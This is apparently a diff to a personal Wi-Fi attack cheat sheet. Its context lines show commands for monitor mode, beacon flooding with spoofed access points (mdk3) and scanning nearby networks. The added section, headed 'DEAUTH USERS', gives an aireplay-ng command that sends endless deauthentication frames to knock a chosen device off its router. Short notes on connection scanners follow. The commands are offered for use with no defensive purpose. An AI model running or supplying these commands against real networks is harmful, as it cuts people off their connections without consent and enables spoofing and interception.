@@ -70,6 +70,11 @@ sudo airmon-ng start wlan0
 sudo mdk3 wlan0 b -c 1 -f ./data/data.lst ## update data.txt with spooffed ap 
 airodump-ng wlan0 -c 11 ## use to monitor local APS 
 
+-----------------------------------------------------[DEAUTH USERS]---------------------------------------------
+
+aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
+
+
 -----------------------------------------------------[WHOS CONNECTINIG TO ME]---------------------------------------------
 netscanner
 angry ip scanner
